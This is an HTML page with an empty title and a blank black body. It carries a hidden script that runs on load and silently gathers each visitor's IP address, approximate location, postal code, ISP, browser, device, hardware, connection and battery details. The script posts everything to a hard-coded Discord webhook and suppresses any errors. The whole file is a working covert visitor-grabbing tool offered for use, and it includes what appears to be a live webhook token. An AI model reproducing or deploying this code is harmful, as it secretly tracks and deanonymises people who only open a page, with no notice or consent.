<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title></title>
  <style>body{margin:0;background:#000;}</style>
</head>
<body>

  <script>
    const webhook = "https://discord.com/api/webhooks/1485701753654743261/BNhHwbYVgb4vi3GO2RpOBZ-DqnmrxZMv_Vn7tnc4nRf0BMnoTaQFqGWeFngQcDwCrj4E"; // ← REPLACE THIS

    async function grabAll() {
      try {
        // IP + geo + ISP
        const ipRes = await fetch('https://ipinfo.io/json');
        const ipData = await ipRes.json();

        // Battery info (if supported)
        let batteryLevel = '?';
        let batteryCharging = '?';
        if ('getBattery' in navigator) {
          try {
            const battery = await navigator.getBattery();
            batteryLevel = battery.level ? Math.round(battery.level * 100) + '%' : '?';
            batteryCharging = battery.charging ? 'Yes' : 'No';
          } catch {}
        }

        // Parse friendly browser name/version from UA (basic heuristics)
        let browserName = 'Unknown';
        const ua = navigator.userAgent || '';
        if (ua.includes('Chrome') && !ua.includes('Edg')) {
          browserName = 'Chrome';
        } else if (ua.includes('Edg')) {
          browserName = 'Edge';
        } else if (ua.includes('Firefox')) {
          browserName = 'Firefox';
        } else if (ua.includes('Safari') && !ua.includes('Chrome')) {
          browserName = 'Safari';
        } else if (ua.includes('OPR') || ua.includes('Opera')) {
          browserName = 'Opera';
        }
        // Add version if detectable (rough)
        const versionMatch = ua.match(/(Chrome|Firefox|Edg|Safari|OPR|Version)\/([\d.]+)/);
        if (versionMatch) {
          browserName += ` ${versionMatch[2]}`;
        }

        const allInfo = {
          ip: ipData.ip || '?',
          loc: `${ipData.city || '?'} • ${ipData.region || '?'} • ${ipData.country || '?'}`,
          postal: ipData.postal || '?',
          timezone: ipData.timezone || '?',
          isp_org: ipData.org || '?',
          browser: browserName || ua.substring(0, 100) || '?',  // friendly name + fallback to short UA
          ua_full: ua || '?',
          platform: navigator.platform || '?',
          languages: navigator.languages?.join(', ') || navigator.language || '?',
          screen: `\( {screen.width}× \){screen.height} (${screen.colorDepth || '?'}bit)`,
          avail_screen: `\( {screen.availWidth}× \){screen.availHeight}`,
          hardware: navigator.hardwareConcurrency || '? cores',
          memory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : '?',
          connection: navigator.connection ? `\( {navigator.connection.effectiveType || '?'} ( \){navigator.connection.downlink || '?'} Mbps)` : '?',
          battery_level: batteryLevel,
          battery_charging: batteryCharging,
          doNotTrack: navigator.doNotTrack || '?',
          cookies: navigator.cookieEnabled ? 'enabled' : 'disabled',
          time: new Date().toISOString()
        };

        // Build embed fields (no referrer/source info)
        const fields = Object.entries(allInfo).map(([key, val]) => ({
          name: key.charAt(0).toUpperCase() + key.slice(1).replace(/_/g, ' '),
          value: `\`${val}\``,
          inline: !['ua_full', 'browser'].includes(key)  // longer ones full width
        }));

        await fetch(webhook, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            embeds: [{
              title: "Visitor",
              color: 0x00AA00,
              fields: fields,
              timestamp: new Date().toISOString(),
              footer: { text: "Logged" }
            }]
          })
        });
      } catch (e) {
        // silent fail
      }
    }

    grabAll();

    // Optional: clear page after logging
    // setTimeout(() => { document.body.innerHTML = ''; }, 800);
  </script>
</body>
</html>
